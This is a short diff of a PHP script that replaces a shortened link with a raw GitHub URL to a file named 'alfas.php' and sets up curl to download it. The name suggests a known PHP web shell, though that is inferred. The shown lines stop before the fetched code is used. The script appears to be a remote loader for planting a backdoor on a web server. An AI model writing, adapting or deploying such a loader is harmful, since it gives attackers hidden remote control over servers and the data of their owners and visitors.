@@ -1,5 +1,5 @@
 <?php
-$url = "http://bit.ly/alfasx1";
+$url = "https://github.com/kembarbaru120000/213/raw/refs/heads/main/alfas.php";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
